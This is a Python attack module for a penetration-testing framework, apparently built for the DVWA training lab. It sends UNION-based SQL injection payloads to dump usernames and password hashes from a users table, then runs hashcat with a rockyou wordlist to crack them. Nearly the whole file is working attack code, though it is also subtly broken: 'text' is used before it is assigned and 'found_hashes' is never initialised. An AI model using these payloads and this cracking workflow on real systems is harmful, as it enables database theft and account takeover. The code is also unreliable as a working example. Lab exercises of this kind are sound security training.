from base_module import BaseModule
from utils import colored
import requests
import subprocess
import os
import re

class DVWASQLI(BaseModule):
    def __init__(self):
        super().__init__()
        self.name = "dvwa_sqli"
        self.description = "DVWA SQL Injection + Hash Cracking (Part 5)"

        self.options = {
            "RHOST": {"value": "192.168.107.129", "required": True, "description": "Target DVWA IP or URL"},
            "RPORT": {"value": "80", "required": True, "description": "Target DVWA port"},
            "WORDLIST": {"value": "/usr/share/wordlists/rockyou.txt", "required": False, "description": "Path to wordlist for hashcat"},
        }

        self.session = None
        self.logged_in = False
        self.hashes_file = "dvwa_hashes.txt"

    def show_options(self):
        print(colored(f"\nModule options ({self.name}):", "orange"))

        header = f"{'Name':<15} {'Current Setting':<30} {'Required':<10} {'Description'}"
        print(colored(header, "yellow"))
        print("-" * 80)

        for name, data in self.options.items():
            value = data.get("value", "")
            required = "yes" if data.get("required") else "no"
            desc = data.get("description", "")
            print(f"{name:<15} {colored(value, 'green'):<30} {colored(required, 'red'):<10} {desc}")

    def show_help(self):
        print(colored("\n=== DVWA SQL Injection Module (Part 5) ===", "orange"))
        print("This module dumps the users table and cracks hashes with hashcat")
        print("Commands:")
        print("  run                  - Perform SQL injection dump + crack")
        print("  set <option> <value> - Set RHOST, WORDLIST, etc.")
        print("  show options         - Show current settings")
        print("  help                 - Show this help")
        print("  back / exit          - Return to framework\n")

    def handle_command(self, cmd_input):
        cmd = cmd_input.strip()
        low = cmd.lower()

        if low in ["help", "show options"]:
            self.show_options()
            self.show_help()
            return

        if low.startswith("set "):
            parts = cmd.split(maxsplit=2)
            if len(parts) < 3:
                print("Usage: set <option> <value>")
                return
            option = parts[1].upper()
            value = parts[2]

            if option in self.options:
                self.options[option]["value"] = value
                print(colored(f"{option} â†’ {value}", "green"))
            else:
                print(colored(f"Unknown option: {option}", "red"))
            return

        if low in ["run", "exploit"]:
            self.run()
            return

        if low in ["back", "exit", "quit"]:
            print(colored("[*] Returning to Bandito framework...", "yellow"))
            return

        print(colored(f"[-] Unknown command: {cmd}", "red"))
        print("Type 'help' for available commands.")

    def run(self):
        rhost = self.options["RHOST"]["value"]
        print(colored(f"[*] Starting SQL Injection on {rhost}", "yellow"))

        vuln_url = f"http://{rhost}/vulnerabilities/sqli/"
        payloads = [
            "1' UNION SELECT user, password FROM users-- ",
            "1' UNION SELECT user_id, password FROM users-- ",
            "1' OR '1'='1-- "  # fallback test
        ]

        found_entries = []

        for payload in payloads:
            print(colored(f"  Trying payload: {payload}", "yellow"))
            data = {"id": payload, "Submit": "Submit"}

            try:
                r = requests.post(vuln_url, data=data, timeout=5)
                print(colored(f"    Status: {r.status_code} | Length: {len(r.text)} chars", "green"))

                # Use BeautifulSoup to parse the response
                from bs4 import BeautifulSoup
                soup = BeautifulSoup(r.text, "html.parser")
                print(colored("Full page text (first 1000 chars):", "yellow"))
                print(text[:1000])

                # Find all text blocks
                text = soup.get_text(separator="\n", strip=True)

                # Look for lines with username-like and 32-char hash
                lines = text.split("\n")
                current_user = None
                for line in lines:
                    line = line.strip()
                    if "name:" in line.lower() or "user:" in line.lower():
                        current_user = line.split(":", 1)[-1].strip()
                    elif len(line) == 32 and all(c in "0123456789abcdef" for c in line.lower()):
                        if current_user:
                            found_entries.append((current_user, line))
                            print(colored(f"    [+] Found: {current_user} : {line}", "green"))
                            current_user = None
                        else:
                            found_hashes.add(line.lower())
                            print(colored(f"    [+] Found hash: {line}", "green"))

                # Fallback: search all text for 32-char hex
                fallback_hashes = re.findall(r'\b[a-f0-9]{32}\b', text, re.IGNORECASE)
                for h in fallback_hashes:
                    h = h.lower()
                    if h not in found_hashes:
                        found_hashes.add(h)
                        print(colored(f"    [+] Fallback hash: {h}", "green"))

            except Exception as e:
                print(colored(f"    [-] Request failed: {e}", "red"))

        if not found_entries:
            print(colored("[-] No valid user:hashes found. Check response or security level.", "red"))
            return

        print(colored(f"[+] Found {len(found_entries)} user entries", "green"))

        # Save only the hashes to file
        with open(self.hashes_file, "w") as f:
            for _, hash_val in found_entries:
                f.write(hash_val + "\n")

        print(colored(f"[+] Hashes saved to {self.hashes_file}", "green"))

        # Crack
        wordlist = self.options["WORDLIST"]["value"]
        if os.path.exists(wordlist):
            print(colored(f"[*] Starting hashcat (-m 0 -a 0 -O --force)...", "yellow"))
            try:
                result = subprocess.run([
                    "hashcat", "-m", "0", "-a", "0", "-O", "--force",
                    "--session", "dvwa_sqli",
                    self.hashes_file, wordlist
                ], capture_output=True, text=True)
                print(colored(result.stdout, "green"))
                print(colored("[+] Hashcat finished. View cracked passwords:", "green"))
                print(colored(f"    hashcat -m 0 {self.hashes_file} --show", "yellow"))
            except Exception as e:
                print(colored(f"[-] Hashcat failed: {e}", "red"))
        else:
            print(colored(f"[-] Wordlist not found: {wordlist}", "red"))
            print("Run hashcat manually after setting WORDLIST.")